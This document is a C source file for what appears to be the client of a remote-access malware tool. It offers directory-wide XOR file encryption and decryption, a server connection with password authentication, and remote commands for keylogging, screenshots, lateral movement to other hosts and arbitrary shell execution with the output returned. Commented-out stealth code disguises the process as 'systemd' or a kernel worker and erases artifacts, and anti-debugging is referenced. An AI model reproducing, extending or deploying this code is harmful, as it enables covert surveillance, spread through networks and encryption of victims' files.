#include "client_base.h"
#include "crypto.h"
#include "anti_debug.h"
#include "stealth.h"
#include "postexp.h"

int main(int argc, char *argv[]) {
    int sockfd, opt;
    char server_ip[BUFFER_SIZE] = DEFAULT_SERVER_IP;
    char server_port[BUFFER_SIZE] = DEFAULT_SERVER_PORT;
    char password[BUFFER_SIZE] = "";
    char xor_key[BUFFER_SIZE] = "mysecretpass1"; // Default XOR key
    char *encrypt_dir = NULL;
    char *decrypt_dir = NULL;

    struct addrinfo hints, *res, *p;

    // Perform anti-debugging checks
    // Disabling anti_debug since it is buggy
    // perform_anti_debug_checks(); 

    // Apply stealth features
    // Disabling stealth features since it is buggy
    /*
     rename_process("systemd");
     change_cmdline("[kworker/u8:2]");
     clean_artifacts();
     dynamic_sleep(5, 10); // Base time: 5 seconds, Jitter: 10 seconds
    */

    // Parse command-line arguments
    while ((opt = getopt(argc, argv, "i:p:w:e:d:k:")) != -1) {
        switch (opt) {
            case 'i':
                strncpy(server_ip, optarg, BUFFER_SIZE);
                break;
            case 'p':
                strncpy(server_port, optarg, BUFFER_SIZE);
                break;
            case 'w':
                strncpy(password, optarg, BUFFER_SIZE);
                break;
            case 'e':
                encrypt_dir = optarg;
                break;
            case 'd':
                decrypt_dir = optarg;
                break;
            case 'k':
                strncpy(xor_key, optarg, BUFFER_SIZE);
                break;
            default:
                print_usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    // Check for encryption or decryption flags
    if (encrypt_dir && decrypt_dir) {
        fprintf(stderr, "Error: Cannot specify both -e (encrypt) and -d (decrypt) simultaneously.\n");
        print_usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if (encrypt_dir) {
        printf("Encrypting files in directory: %s\n", encrypt_dir);
        process_directory(encrypt_dir, xor_key, 0); // Encryption mode
        return 0;
    }

    if (decrypt_dir) {
        printf("Decrypting files in directory: %s\n", decrypt_dir);
        process_directory(decrypt_dir, xor_key, 1); // Decryption mode
        return 0;
    }

    // Ensure required parameters for server connection
    if (strlen(password) == 0) {
        fprintf(stderr, "Error: Password is required.\n");
        print_usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    // Setup network connection
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC; // Support both IPv4 and IPv6
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(server_ip, server_port, &hints, &res) != 0) {
        error_exit("Error resolving server address");
    }

    for (p = res; p != NULL; p = p->ai_next) {
        sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (sockfd < 0) continue;

        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == 0) break;

        close(sockfd);
    }

    if (!p) {
        fprintf(stderr, "Error: Unable to connect to server at %s:%s\n", server_ip, server_port);
        freeaddrinfo(res);
        exit(EXIT_FAILURE);
    }

    freeaddrinfo(res);
    printf("Connected to server at %s:%s\n", server_ip, server_port);

    // Authenticate with server
    if (!authenticate(sockfd, password)) {
        close(sockfd);
        return 1;
    }

    // Main loop to execute commands
    printf("Enter commands to execute on the server. Type 'exit' to quit.\n");
    char command[BUFFER_SIZE];
    while (1) {
        printf("> ");
        if (!fgets(command, BUFFER_SIZE, stdin)) break;
        command[strcspn(command, "\n")] = '\0'; // Remove newline character

        if (strcmp(command, "exit") == 0) break;

        if (strcmp(command, "start_keylog") == 0) {
            start_keylogging("keylog.txt");
        } else if (strcmp(command, "stop_keylog") == 0) {
            stop_keylogging();
        } else if (strcmp(command, "capture_screenshot") == 0) {
            capture_screenshot("screenshot.png");
        } else if (strncmp(command, "lateral_move ", 13) == 0) {
            char *args = command + 13;
            char *target_ip = strtok(args, " ");
            char *remote_command = strtok(NULL, "");
            if (target_ip && remote_command) {
                lateral_movement(target_ip, remote_command);
            } else {
                printf("Usage: lateral_move <target_ip> <command>\n");
            }
        } else {
            execute_command_and_send_output(command, sockfd);
        }
    }

    // Clean up
    close(sockfd);
    printf("Disconnected from server.\n");
    return 0;
}